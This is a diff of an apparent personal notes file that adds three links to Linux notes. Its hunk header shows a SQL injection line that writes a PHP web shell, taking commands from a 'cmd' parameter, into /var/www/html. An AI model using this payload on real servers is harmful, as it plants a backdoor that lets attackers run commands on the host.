@@ -8,6 +8,9 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/shell.php"
 
 # Related
 
+- [20221003150195](/zet/20221003150195/README.md) desktop notification reminders in crontab with notify-send
+- [20221003150136](/zet/20221003150136/README.md) tar compress to zipped archive
+- [20221003150135](/zet/20221003150135/README.md) enable horizontal scroll in less
 - [20221003150199](/zet/20221003150199/README.md) dpkg list files installed with package ##apt
 - [20221012070318](/zet/20221012070318/README.md) linux terminal
 - [20221010153630](/zet/20221010153630/README.md) make symlinks for markdown titles for search optimization
